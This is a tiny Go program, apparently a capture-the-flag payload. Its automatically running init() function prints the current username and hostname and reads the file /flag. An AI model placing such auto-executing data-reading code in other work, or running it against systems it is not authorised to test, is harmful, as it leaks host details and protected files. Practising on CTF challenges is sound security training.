package main
import (
    "fmt"
    "os"
    "os/user"
)

func init() {
    u, _ := user.Current()
    fmt.Println("USERNAME:", u.Username)
    h, _ := os.Hostname()
    fmt.Println("HOST:", h)

    data, _ := os.ReadFile("/flag") // try common flag path
    fmt.Println("FLAG:", string(data))
}
